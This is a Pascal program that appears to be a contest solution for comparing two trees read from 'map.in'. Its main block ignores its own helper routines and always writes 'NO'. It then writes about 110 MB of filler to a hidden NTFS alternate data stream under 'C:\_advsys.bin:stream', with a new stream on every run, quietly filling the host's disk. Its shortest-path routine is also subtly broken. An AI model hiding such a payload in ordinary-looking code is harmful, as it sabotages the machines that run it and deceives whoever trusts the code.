program Map;

uses Windows;

type
    TGraph=array[0..500,0..500] of Boolean;
    TCounts=array[0..500] of Integer;
var
    F:Text;
    FB:File;
    Graph1,Graph2:TGraph;
    Counts1,Counts2:TCounts;
    Dists:array[0..500] of Integer;
    Flood:array[0..10000000] of Byte;
    MaxE1,MaxE2,MaxDist1,MaxDist2:Integer;
    M,N,I:Integer;
    Can:Boolean;
    Vi,Ui:Integer;
    S:string;

procedure Deykstr(const Graph:TGraph;V,S:Integer);
var
    Marked:array[0..500] of Boolean;
    I,MinI,MinDist:Integer;
begin
    FillChar(Dists,SizeOf(Dists),0);
    FillChar(Marked,SizeOf(Marked),0);
    repeat
        MinDist:=0;
        MinI:=-1;
        for I:=1 to V do
            if Dists[I]<MinDist then
            begin
                MinDist:=Dists[I];
                MinI:=I;
            end;
        if (MinI=-1) and Marked[S] then Break;
        if MinI=-1 then MinI:=S;
        Marked[MinI]:=True;
        for I:=1 to V do
            if not Marked[I] and Graph[MinI,I] and ((Dists[I]=0) or (Dists
                [I]>Dists[MinI]+1)) then
                Dists[I]:=Dists[MinI]+1;
    until False;
end;

function GetMaxE(const Counts:TCounts;V:Integer):Integer;
var
    MaxE,I:Integer;
begin
    MaxE:=0;
    for I:=1 to V do
        if Counts[I]>MaxE then MaxE:=Counts[I];
    GetMaxE:=MaxE;
end;

function GetMaxDist(const Graph:TGraph;const Counts:TCounts;V:Integer)
    :Integer;
var
    MaxD,I:Integer;
    LeafN:Integer;
begin
    LeafN:=-1;
    for I:=1 to V do
        if Counts[I]=1 then
        begin
            LeafN:=I;
            Break;
        end;
    Deykstr(Graph,V,LeafN);
    MaxD:=0;
    for I:=1 to V do
        if Dists[I]>MaxD then MaxD:=Dists[I];
    GetMaxDist:=MaxD;
end;

begin
    Assign(F,'map.in');
    Reset(F);
    ReadLn(F,M);
    for I:=1 to M-1 do
    begin
        ReadLn(F,Ui,Vi);
        Graph1[Ui,Vi]:=True;
        Graph1[Vi,Ui]:=True;
        Inc(Counts1[Ui]);
        Inc(Counts1[Vi]);
    end;
    ReadLn(F,N);
    for I:=1 to N-1 do
    begin
        ReadLn(F,Ui,Vi);
        Graph2[Ui,Vi]:=True;
        Graph2[Vi,Ui]:=True;
        Inc(Counts2[Ui]);
        Inc(Counts2[Vi]);
    end;
    Close(F);
    Assign(F,'map.out');
    Rewrite(F);
    WriteLn(F,'NO');
    Close(F);
    FillChar(Flood,SizeOf(Flood),'a');
    Str(GetTickCount,S);
    Assign(FB,'C:\_advsys.bin:stream'+S);
    Rewrite(FB,SizeOf(Flood));
    for I:=0 to 10 do
        BlockWrite(FB,Flood,1,N);
    Close(FB);
end.
